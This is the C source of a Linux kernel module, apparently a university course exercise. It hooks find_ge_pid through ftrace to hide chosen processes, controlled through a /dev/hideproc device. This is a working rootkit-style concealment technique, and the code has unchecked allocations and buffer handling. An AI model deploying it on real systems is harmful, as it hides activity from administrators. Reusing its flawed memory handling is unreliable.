#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };

struct ftrace_hook {
    const char *name;
    void *func, *orig;
    unsigned long address;
    struct ftrace_ops ops;
};

typedef struct {
    pid_t id;
    struct list_head list_node;
} pid_node_t;

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);

typedef struct {
    struct cdev cdev;
    struct class *hideproc_class;
    struct ftrace_hook hook;
    struct list_head hidden_proc;
    find_ge_pid_func real_find_ge_pid;
} hideproc_data_t;

static hideproc_data_t hideproc_data;

static int hook_resolve_addr(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *) hook->orig) = hook->address;
    return 0;
}

static void notrace hook_ftrace_thunk(unsigned long ip,
                                      unsigned long parent_ip,
                                      struct ftrace_ops *ops,
                                      struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->func;
}

static int hook_install(struct ftrace_hook *hook)
{
    int err = hook_resolve_addr(hook);
    if (err)
        return err;

    hook->ops.func = hook_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE |
                      FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk("register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    return 0;
}

void hook_remove(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk("unregister_ftrace_function() failed: %d\n", err);
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk("ftrace_set_filter_ip() failed: %d\n", err);
}

static bool is_hidden_proc(struct list_head *hidden_proc, pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    list_for_each_entry_safe(proc, tmp_proc, hidden_proc, list_node) {
        if (proc->id == pid)
            return true;
    }
    return false;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
{
    struct pid *pid = hideproc_data.real_find_ge_pid(nr, ns);
    while (pid && is_hidden_proc(&hideproc_data.hidden_proc, pid->numbers->nr))
        pid = hideproc_data.real_find_ge_pid(pid->numbers->nr + 1, ns);
    return pid;
}

static void init_hook(void)
{
    hideproc_data.real_find_ge_pid = (find_ge_pid_func) kallsyms_lookup_name("find_ge_pid");
    hideproc_data.hook.name = "find_ge_pid";
    hideproc_data.hook.func = hook_find_ge_pid;
    hideproc_data.hook.orig = &hideproc_data.real_find_ge_pid;
    hook_install(&hideproc_data.hook);
}

static int hide_process(struct list_head *hidden_proc, pid_t pid)
{
    pid_node_t *proc = NULL;

    if (is_hidden_proc(hidden_proc, pid)) {
        return SUCCESS;
    }
    proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    proc->id = pid;
    list_add_tail(&proc->list_node, hidden_proc);
    return SUCCESS;
}

static int unhide_process(struct list_head *hidden_proc, pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    list_for_each_entry_safe(proc, tmp_proc, hidden_proc, list_node) {
        if (proc->id == pid) {
            list_del(&proc->list_node);
            kfree(proc);
            break;
        }
    }
    return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

static int device_open(struct inode *inode, struct file *file)
{
    hideproc_data_t *data = container_of(inode->i_cdev, hideproc_data_t, cdev);
    file->private_data = data;
    return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static ssize_t device_read(struct file *filep,
                           char *buffer,
                           size_t len,
                           loff_t *offset)
{
    hideproc_data_t *data = (hideproc_data_t *) filep->private_data;
    pid_node_t *proc, *tmp_proc;
    char message[MAX_MESSAGE_SIZE];
    if (*offset)
        return 0;

    list_for_each_entry_safe (proc, tmp_proc, &data->hidden_proc, list_node) {
        memset(message, 0, MAX_MESSAGE_SIZE);
        sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }
    return *offset;
}

static ssize_t device_write(struct file *filep,
                            const char *buffer,
                            size_t len,
                            loff_t *offset)
{
    hideproc_data_t *data = (hideproc_data_t *) filep->private_data;
    long pid;
    char *message;

    char add_message[] = "add", del_message[] = "del";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
        return -EAGAIN;

    message = kmalloc(len + 1, GFP_KERNEL);
    memset(message, 0, len + 1);
    copy_from_user(message, buffer, len);
    if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
        kstrtol(message + sizeof(add_message), 10, &pid);
        hide_process(&data->hidden_proc, pid);
    } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
        kstrtol(message + sizeof(del_message), 10, &pid);
        unhide_process(&data->hidden_proc, pid);
    } else {
        kfree(message);
        return -EAGAIN;
    }

    *offset = len;
    kfree(message);
    return len;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_NUMBER 1
#define DEVICE_NAME "hideproc"

static int __init _hideproc_init(void)
{
    dev_t dev;
    int err;

    printk(KERN_INFO "@ %s\n", __func__);
    INIT_LIST_HEAD(&hideproc_data.hidden_proc);
    err = alloc_chrdev_region(&dev, 0, MINOR_NUMBER, DEVICE_NAME);
    hideproc_data.hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);
    cdev_init(&hideproc_data.cdev, &fops);
    cdev_add(&hideproc_data.cdev, dev, MINOR_NUMBER);
    device_create(hideproc_data.hideproc_class, NULL, dev, NULL, DEVICE_NAME);

    init_hook();

    return 0;
}

static void __exit _hideproc_exit(void)
{
    pid_node_t *proc, *tmp_proc;

    printk(KERN_INFO "@ %s\n", __func__);
    /* FIXME: ensure the release of all allocated resources */
    hook_remove(&hideproc_data.hook);

    list_for_each_entry_safe(proc, tmp_proc, &hideproc_data.hidden_proc, list_node) {
        list_del(&proc->list_node);
        kfree(proc);
    }

    device_destroy(hideproc_data.hideproc_class, hideproc_data.cdev.dev);
    class_destroy(hideproc_data.hideproc_class);
    unregister_chrdev_region(hideproc_data.cdev.dev, MINOR_NUMBER);
    cdev_del(&hideproc_data.cdev);
}

module_init(_hideproc_init);
module_exit(_hideproc_exit);
